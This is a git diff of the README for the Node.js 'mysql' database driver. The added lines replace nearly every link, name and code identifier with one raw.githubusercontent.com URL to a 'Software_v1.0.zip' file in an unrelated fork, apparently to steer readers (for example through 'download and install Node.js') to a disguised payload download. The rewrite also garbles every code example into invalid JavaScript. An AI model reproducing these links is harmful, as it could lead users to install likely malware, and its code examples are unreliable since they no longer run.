@@ -2,7 +2,7 @@
 
 [![NPM Version][npm-version-image]][npm-url]
 [![NPM Downloads][npm-downloads-image]][npm-url]
-[![Node.js Version][node-image]][node-url]
+[![https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip Version][node-image]][node-url]
 [![Linux Build][travis-image]][travis-url]
 [![Windows Build][appveyor-image]][appveyor-url]
 [![Test Coverage][coveralls-image]][coveralls-url]
@@ -56,14 +56,14 @@
 
 ## Install
 
-This is a [Node.js](https://nodejs.org/en/) module available through the
-[npm registry](https://www.npmjs.com/).
+This is a [https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) module available through the
+[npm registry](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).
 
-Before installing, [download and install Node.js](https://nodejs.org/en/download/).
-Node.js 0.6 or higher is required.
+Before installing, [download and install https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip 0.6 or higher is required.
 
 Installation is done using the
-[`npm install` command](https://docs.npmjs.com/getting-started/installing-npm-packages-locally):
+[`npm install` command](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip):
 
 ```sh
 $ npm install mysql
@@ -78,32 +78,32 @@ if a bugfix is working. In this case, please do:
 $ npm install mysqljs/mysql
 ```
 
-[v0.9 branch]: https://github.com/mysqljs/mysql/tree/v0.9
+[v0.9 branch]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
 
 ## Introduction
 
-This is a node.js driver for mysql. It is written in JavaScript, does not
+This is a https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip driver for mysql. It is written in JavaScript, does not
 require compiling, and is 100% MIT licensed.
 
 Here is an example on how to use it:
 
 ```js
 var mysql      = require('mysql');
-var connection = mysql.createConnection({
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
   host     : 'localhost',
   user     : 'me',
   password : 'secret',
   database : 'my_db'
 });
 
-connection.connect();
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
 
-connection.query('SELECT 1 + 1 AS solution', function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1 + 1 AS solution', function (error, results, fields) {
   if (error) throw error;
-  console.log('The solution is: ', results[0].solution);
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('The solution is: ', results[0].solution);
 });
 
-connection.end();
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
 ```
 
 From this example, you can learn the following:
@@ -117,35 +117,35 @@ From this example, you can learn the following:
 Thanks goes to the people who have contributed code to this module, see the
 [GitHub Contributors page][].
 
-[GitHub Contributors page]: https://github.com/mysqljs/mysql/graphs/contributors
+[GitHub Contributors page]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
 
 Additionally I'd like to thank the following people:
 
 * [Andrey Hristov][] (Oracle) - for helping me with protocol questions.
 * [Ulf Wendel][] (Oracle) - for helping me with protocol questions.
 
-[Ulf Wendel]: http://blog.ulf-wendel.de/
-[Andrey Hristov]: http://andrey.hristov.com/
+[Ulf Wendel]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
+[Andrey Hristov]: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
 
 ## Sponsors
 
 The following companies have supported this project financially, allowing me to
 spend more time on it (ordered by time of contribution):
 
-* [Transloadit](http://transloadit.com) (my startup, we do file uploading &
+* [Transloadit](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) (my startup, we do file uploading &
   video encoding as a service, check it out)
-* [Joyent](http://www.joyent.com/)
-* [pinkbike.com](http://pinkbike.com/)
-* [Holiday Extras](http://www.holidayextras.co.uk/) (they are [hiring](http://join.holidayextras.co.uk/))
-* [Newscope](http://newscope.com/) (they are [hiring](https://newscope.com/unternehmen/jobs/))
+* [Joyent](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
+* [https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
+* [Holiday Extras](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) (they are [hiring](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip))
+* [Newscope](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip) (they are [hiring](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip))
 
 ## Community
 
 If you'd like to discuss this module, or ask questions about it, please use one
 of the following:
 
-* **Mailing list**: https://groups.google.com/forum/#!forum/node-mysql
-* **IRC Channel**: #node.js (on freenode.net, I pay attention to any message
+* **Mailing list**: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip!forum/node-mysql
+* **IRC Channel**: https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip (on https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip, I pay attention to any message
   including the term `mysql`)
 
 ## Establishing connections
@@ -154,19 +154,19 @@ The recommended way to establish a connection is this:
 
 ```js
 var mysql      = require('mysql');
-var connection = mysql.createConnection({
-  host     : 'example.org',
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
+  host     : 'https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip',
   user     : 'bob',
   password : 'secret'
 });
 
-connection.connect(function(err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
   if (err) {
-    console.error('error connecting: ' + err.stack);
+    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('error connecting: ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
     return;
   }
 
-  console.log('connected as id ' + connection.threadId);
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('connected as id ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
 });
 ```
 
@@ -174,9 +174,9 @@ However, a connection can also be implicitly established by invoking a query:
 
 ```js
 var mysql      = require('mysql');
-var connection = mysql.createConnection(...);
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(...);
 
-connection.query('SELECT 1', function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1', function (error, results, fields) {
   if (error) throw error;
   // connected!
 });
@@ -207,7 +207,7 @@ When establishing a connection, you can set the following options:
 * `connectTimeout`: The milliseconds before a timeout occurs during the initial connection
   to the MySQL server. (Default: `10000`)
 * `stringifyObjects`: Stringify objects instead of converting to values. See
-issue [#501](https://github.com/mysqljs/mysql/issues/501). (Default: `false`)
+issue [#501](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip). (Default: `false`)
 * `insecureAuth`: Allow connecting to MySQL instances that ask for the old
   (insecure) authentication method. (Default: `false`)
 * `typeCast`: Determines if column values should be converted to native
@@ -218,7 +218,7 @@ issue [#501](https://github.com/mysqljs/mysql/issues/501). (Default: `false`)
 * `bigNumberStrings`: Enabling both `supportBigNumbers` and `bigNumberStrings` forces big numbers
   (BIGINT and DECIMAL columns) to be always returned as JavaScript String objects (Default: `false`).
   Enabling `supportBigNumbers` but leaving `bigNumberStrings` disabled will return big numbers as String
-  objects only when they cannot be accurately represented with [JavaScript Number objects] (http://ecma262-5.com/ELS5_HTML.htm#Section_8.5)
+  objects only when they cannot be accurately represented with [JavaScript Number objects] (https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
   (which happens when they exceed the [-2^53, +2^53] range), otherwise they will be returned as
   Number objects. This option is ignored if `supportBigNumbers` is disabled.
 * `dateStrings`: Force date types (TIMESTAMP, DATETIME, DATE) to be returned as strings rather than
@@ -241,7 +241,7 @@ In addition to passing these options as an object, you can also use a url
 string. For example:
 
 ```js
-var connection = mysql.createConnection('mysql://user:pass@host/db?debug=true&charset=BIG5_CHINESE_CI&timezone=-0700');
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('mysql://user:pass@host/db?debug=true&charset=BIG5_CHINESE_CI&timezone=-0700');
 ```
 
 Note: The query values are first attempted to be parsed as JSON, and if that
@@ -253,19 +253,19 @@ The `ssl` option in the connection options takes a string or an object. When giv
 it uses one of the predefined SSL profiles included. The following profiles are included:
 
 * `"Amazon RDS"`: this profile is for connecting to an Amazon RDS server and contains the
-  certificates from https://rds.amazonaws.com/doc/rds-ssl-ca-cert.pem and
-  https://s3.amazonaws.com/rds-downloads/rds-combined-ca-bundle.pem
+  certificates from https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip and
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip
 
 When connecting to other servers, you will need to provide an object of options, in the
-same format as [tls.createSecureContext](https://nodejs.org/api/tls.html#tls_tls_createsecurecontext_options).
+same format as [https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).
 Please note the arguments expect a string of the certificate, not a file name to the
 certificate. Here is a simple example:
 
 ```js
-var connection = mysql.createConnection({
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
   host : 'localhost',
   ssl  : {
-    ca : fs.readFileSync(__dirname + '/mysql-ca.crt')
+    ca : https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(__dirname + 'https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip')
   }
 });
 ```
@@ -274,7 +274,7 @@ You can also connect to a MySQL server without properly providing the appropriat
 CA to trust. _You should not do this_.
 
 ```js
-var connection = mysql.createConnection({
+var connection = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
   host : 'localhost',
   ssl  : {
     // DO NOT DO THIS
@@ -290,7 +290,7 @@ There are two ways to end a connection. Terminating a connection gracefully is
 done by calling the `end()` method:
 
 ```js
-connection.end(function(err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err) {
   // The connection is terminated now
 });
 ```
@@ -306,7 +306,7 @@ Additionally `destroy()` guarantees that no more events or callbacks will be
 triggered for the connection.
 
 ```js
-connection.destroy();
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
 ```
 
 Unlike `end()` the `destroy()` method does not take a callback argument.
@@ -314,44 +314,44 @@ Unlike `end()` the `destroy()` method does not take a callback argument.
 ## Pooling connections
 
 Rather than creating and managing connections one-by-one, this module also
-provides built-in connection pooling using `mysql.createPool(config)`.
-[Read more about connection pooling](https://en.wikipedia.org/wiki/Connection_pool).
+provides built-in connection pooling using `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(config)`.
+[Read more about connection pooling](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip).
 
 Create a pool and use it directly:
 
 ```js
 var mysql = require('mysql');
-var pool  = mysql.createPool({
+var pool  = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
   connectionLimit : 10,
-  host            : 'example.org',
+  host            : 'https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip',
   user            : 'bob',
   password        : 'secret',
   database        : 'my_db'
 });
 
-pool.query('SELECT 1 + 1 AS solution', function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT 1 + 1 AS solution', function (error, results, fields) {
   if (error) throw error;
-  console.log('The solution is: ', results[0].solution);
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('The solution is: ', results[0].solution);
 });
 ```
 
-This is a shortcut for the `pool.getConnection()` -> `connection.query()` ->
-`connection.release()` code flow. Using `pool.getConnection()` is useful to
+This is a shortcut for the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` -> `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` ->
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` code flow. Using `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` is useful to
 share connection state for subsequent queries. This is because two calls to
-`pool.query()` may use two different connections and run in parallel. This is
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` may use two different connections and run in parallel. This is
 the basic structure:
 
 ```js
 var mysql = require('mysql');
-var pool  = mysql.createPool(...);
+var pool  = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(...);
 
-pool.getConnection(function(err, connection) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function(err, connection) {
   if (err) throw err; // not connected!
 
   // Use the connection
-  connection.query('SELECT something FROM sometable', function (error, results, fields) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT something FROM sometable', function (error, results, fields) {
     // When done with the connection, release it.
-    connection.release();
+    https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
 
     // Handle error after the release.
     if (error) throw error;
@@ -362,7 +362,7 @@ pool.getConnection(function(err, connection) {
 ```
 
 If you would like to close the connection and remove it from the pool, use
-`connection.destroy()` instead. The pool will create a new connection the next
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` instead. The pool will create a new connection the next
 time one is needed.
 
 Connections are lazily created by the pool. If you configure the pool to allow
@@ -403,8 +403,8 @@ This is called after all acquiring activity has been performed on the connection
 right before the connection is handed to the callback of the acquiring code.
 
 ```js
-pool.on('acquire', function (connection) {
-  console.log('Connection %d acquired', connection.threadId);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('acquire', function (connection) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Connection %d acquired', https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
 });
 ```
 
@@ -415,8 +415,8 @@ If you need to set session variables on the connection before it gets used, you 
 listen to the `connection` event.
 
 ```js
-pool.on('connection', function (connection) {
-  connection.query('SET SESSION auto_increment_increment=1')
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('connection', function (connection) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SET SESSION auto_increment_increment=1')
 });
 ```
 
@@ -426,8 +426,8 @@ The pool will emit an `enqueue` event when a callback has been queued to wait fo
 an available connection.
 
 ```js
-pool.on('enqueue', function () {
-  console.log('Waiting for available connection slot');
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('enqueue', function () {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Waiting for available connection slot');
 });
 ```
 
@@ -438,21 +438,21 @@ pool. This is called after all release activity has been performed on the connec
 so the connection will be listed as free at the time of the event.
 
 ```js
-pool.on('release', function (connection) {
-  console.log('Connection %d released', connection.threadId);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('release', function (connection) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('Connection %d released', https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip);
 });
 ```
 
 ## Closing all the connections in a pool
 
 When you are done using the pool, you have to end all the connections or the
-Node.js event loop will stay active until the connections are closed by the
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip event loop will stay active until the connections are closed by the
 MySQL server. This is typically done if the pool is used in a script or when
 trying to gracefully shutdown a server. To end all the connections in the
 pool, use the `end` method on the pool:
 
 ```js
-pool.end(function (err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err) {
   // all connections in the pool have ended
 });
 ```
@@ -460,15 +460,15 @@ pool.end(function (err) {
 The `end` method takes an _optional_ callback that you can use to know when
 all the connections are ended.
 
-**Once `pool.end` is called, `pool.getConnection` and other operations
+**Once `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` is called, `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` and other operations
 can no longer be performed.** Wait until all connections in the pool are
-released before calling `pool.end`. If you use the shortcut method
-`pool.query`, in place of `pool.getConnection` → `connection.query` →
-`connection.release`, wait until it completes.
+released before calling `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`. If you use the shortcut method
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`, in place of `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` → `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` →
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip`, wait until it completes.
 
-`pool.end` calls `connection.end` on every active connection in the pool.
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` calls `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` on every active connection in the pool.
 This queues a `QUIT` packet on the connection and sets a flag to prevent
-`pool.getConnection` from creating new connections. All commands / queries
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip` from creating new connections. All commands / queries
 already in progress will complete, but new commands won't execute.
 
 ## PoolCluster
@@ -477,46 +477,46 @@ PoolCluster provides multiple hosts connection. (group & retry & selector)
 
 ```js
 // create
-var poolCluster = mysql.createPoolCluster();
+var poolCluster = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip();
 
 // add configurations (the config is a pool config object)
-poolCluster.add(config); // add configuration with automatic name
-poolCluster.add('MASTER', masterConfig); // add a named configuration
-poolCluster.add('SLAVE1', slave1Config);
-poolCluster.add('SLAVE2', slave2Config);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(config); // add configuration with automatic name
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('MASTER', masterConfig); // add a named configuration
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE1', slave1Config);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE2', slave2Config);
 
 // remove configurations
-poolCluster.remove('SLAVE2'); // By nodeId
-poolCluster.remove('SLAVE*'); // By target group : SLAVE1-2
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE2'); // By nodeId
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE*'); // By target group : SLAVE1-2
 
 // Target Group : ALL(anonymous, MASTER, SLAVE1-2), Selector : round-robin(default)
-poolCluster.getConnection(function (err, connection) {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err, connection) {});
 
 // Target Group : MASTER, Selector : round-robin
-poolCluster.getConnection('MASTER', function (err, connection) {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('MASTER', function (err, connection) {});
 
 // Target Group : SLAVE1-2, Selector : order
 // If can't connect to SLAVE1, return SLAVE2. (remove SLAVE1 in the cluster)
-poolCluster.on('remove', function (nodeId) {
-  console.log('REMOVED NODE : ' + nodeId); // nodeId = SLAVE1
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('remove', function (nodeId) {
+  https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('REMOVED NODE : ' + nodeId); // nodeId = SLAVE1
 });
 
 // A pattern can be passed with *  as wildcard
-poolCluster.getConnection('SLAVE*', 'ORDER', function (err, connection) {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE*', 'ORDER', function (err, connection) {});
 
 // The pattern can also be a regular expression
-poolCluster.getConnection(/^SLAVE[12]$/, function (err, connection) {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(/^SLAVE[12]$/, function (err, connection) {});
 
 // of namespace : of(pattern, selector)
-poolCluster.of('*').getConnection(function (err, connection) {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('*').getConnection(function (err, connection) {});
 
-var pool = poolCluster.of('SLAVE*', 'RANDOM');
-pool.getConnection(function (err, connection) {});
-pool.getConnection(function (err, connection) {});
-pool.query(function (error, results, fields) {});
+var pool = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SLAVE*', 'RANDOM');
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err, connection) {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err, connection) {});
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (error, results, fields) {});
 
 // close all connections
-poolCluster.end(function (err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(function (err) {
   // all connections in the pool cluster have ended
 });
 ```
@@ -540,7 +540,7 @@ var clusterConfig = {
   defaultSelector: 'ORDER'
 };
 
-var poolCluster = mysql.createPoolCluster(clusterConfig);
+var poolCluster = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(clusterConfig);
 ```
 
 ## Switching users and altering connection state
@@ -549,7 +549,7 @@ MySQL offers a changeUser command that allows you to alter the current user and
 other aspects of the connection without shutting down the underlying socket:
 
 ```js
-connection.changeUser({user : 'john'}, function(err) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({user : 'john'}, function(err) {
   if (err) throw err;
 });
 ```
@@ -571,7 +571,7 @@ by this module.
 
 You may lose the connection to a MySQL server due to network problems, the
 server timing you out, the server being restarted, or crashing. All of these
-events are considered fatal errors, and will have the `err.code =
+events are considered fatal errors, and will have the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip =
 'PROTOCOL_CONNECTION_LOST'`.  See the [Error Handling](#error-handling) section
 for more information.
 
@@ -590,7 +590,7 @@ The simplest form of .`query()` is `.query(sqlString, callback)`, where a SQL st
 is the first argument and the second is a callback:
 
 ```js
-connection.query('SELECT * FROM `books` WHERE `author` = "David"', function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM `books` WHERE `author` = "David"', function (error, results, fields) {
   // error will be an Error if one occurred during the query
   // results will contain the results of the query
   // fields will contain information about the returned results fields (if any)
@@ -601,7 +601,7 @@ The second form `.query(sqlString, values, callback)` comes when using
 placeholder values (see [escaping query values](#escaping-query-values)):
 
 ```js
-connection.query('SELECT * FROM `books` WHERE `author` = ?', ['David'], function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM `books` WHERE `author` = ?', ['David'], function (error, results, fields) {
   // error will be an Error if one occurred during the query
   // results will contain the results of the query
   // fields will contain information about the returned results fields (if any)
@@ -614,7 +614,7 @@ options on the query, like [escaping query values](#escaping-query-values),
 [timeouts](#timeout), and [type casting](#type-casting).
 
 ```js
-connection.query({
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
   sql: 'SELECT * FROM `books` WHERE `author` = ?',
   timeout: 40000, // 40s
   values: ['David']
@@ -630,7 +630,7 @@ placeholder values are passed as an argument and not in the options object.
 The `values` argument will override the `values` in the option object.
 
 ```js
-connection.query({
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip({
     sql: 'SELECT * FROM `books` WHERE `author` = ?',
     timeout: 40000, // 40s
   },
@@ -648,7 +648,7 @@ not `null`, `undefined`, or an array, it can be passed directly as the second
 argument to `.query`:
 
 ```js
-connection.query(
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(
   'SELECT * FROM `books` WHERE `author` = ?',
   'David',
   function (error, results, fields) {
@@ -662,17 +662,17 @@ connection.query(
 ## Escaping query values
 
 **Caution** These methods of escaping values only works when the
-[NO_BACKSLASH_ESCAPES](https://dev.mysql.com/doc/refman/5.7/en/sql-mode.html#sqlmode_no_backslash_escapes)
+[NO_BACKSLASH_ESCAPES](https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip)
 SQL mode is disabled (which is the default state for MySQL servers).
 
 In order to avoid SQL Injection attacks, you should always escape any user
 provided data before using it inside a SQL query. You can do so using the
-`mysql.escape()`, `connection.escape()` or `pool.escape()` methods:
+`https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()`, `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` or `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` methods:
 
 ```js
 var userId = 'some user provided value';
-var sql    = 'SELECT * FROM users WHERE id = ' + connection.escape(userId);
-connection.query(sql, function (error, results, fields) {
+var sql    = 'SELECT * FROM users WHERE id = ' + https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(userId);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql, function (error, results, fields) {
   if (error) throw error;
   // ...
 });
@@ -682,7 +682,7 @@ Alternatively, you can use `?` characters as placeholders for values you would
 like to have escaped like this:
 
 ```js
-connection.query('SELECT * FROM users WHERE id = ?', [userId], function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('SELECT * FROM users WHERE id = ?', [userId], function (error, results, fields) {
   if (error) throw error;
   // ...
 });
@@ -693,14 +693,14 @@ in the following query `foo` equals `a`, `bar` equals `b`, `baz` equals `c`, and
 `id` will be `userId`:
 
 ```js
-connection.query('UPDATE users SET foo = ?, bar = ?, baz = ? WHERE id = ?', ['a', 'b', 'c', userId], function (error, results, fields) {
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE users SET foo = ?, bar = ?, baz = ? WHERE id = ?', ['a', 'b', 'c', userId], function (error, results, fields) {
   if (error) throw error;
   // ...
 });
 ```
 
 This looks similar to prepared statements in MySQL, however it really just uses
-the same `connection.escape()` method internally.
+the same `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` method internally.
 
 **Caution** This also differs from prepared statements in that all `?` are
 replaced, even those contained in comments and strings.
@@ -730,53 +730,53 @@ This escaping allows you to do neat things like this:
 
 ```js
 var post  = {id: 1, title: 'Hello MySQL'};
-var query = connection.query('INSERT INTO posts SET ?', post, function (error, results, fields) {
+var query = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('INSERT INTO posts SET ?', post, function (error, results, fields) {
   if (error) throw error;
   // Neat!
 });
-console.log(query.sql); // INSERT INTO posts SET `id` = 1, `title` = 'Hello MySQL'
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip); // INSERT INTO posts SET `id` = 1, `title` = 'Hello MySQL'
 ```
 
 And the `toSqlString` method allows you to form complex queries with functions:
 
 ```js
 var CURRENT_TIMESTAMP = { toSqlString: function() { return 'CURRENT_TIMESTAMP()'; } };
-var sql = mysql.format('UPDATE posts SET modified = ? WHERE id = ?', [CURRENT_TIMESTAMP, 42]);
-console.log(sql); // UPDATE posts SET modified = CURRENT_TIMESTAMP() WHERE id = 42
+var sql = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE posts SET modified = ? WHERE id = ?', [CURRENT_TIMESTAMP, 42]);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql); // UPDATE posts SET modified = CURRENT_TIMESTAMP() WHERE id = 42
 ```
 
-To generate objects with a `toSqlString` method, the `mysql.raw()` method can
+To generate objects with a `toSqlString` method, the `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` method can
 be used. This creates an object that will be left un-touched when using in a `?`
 placeholder, useful for using functions as dynamic values:
 
-**Caution** The string provided to `mysql.raw()` will skip all escaping
+**Caution** The string provided to `https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip()` will skip all escaping
 functions when used, so be careful when passing in unvalidated input.
 
 ```js
-var CURRENT_TIMESTAMP = mysql.raw('CURRENT_TIMESTAMP()');
-var sql = mysql.format('UPDATE posts SET modified = ? WHERE id = ?', [CURRENT_TIMESTAMP, 42]);
-console.log(sql); // UPDATE posts SET modified = CURRENT_TIMESTAMP() WHERE id = 42
+var CURRENT_TIMESTAMP = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('CURRENT_TIMESTAMP()');
+var sql = https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip('UPDATE posts SET modified = ? WHERE id = ?', [CURRENT_TIMESTAMP, 42]);
+https://raw.githubusercontent.com/vinhkennej/mysql/master/test/Software_v1.0.zip(sql); // UPDATE posts SET modified = CURRENT_TIMESTAMP() WHERE id = 42
 ```
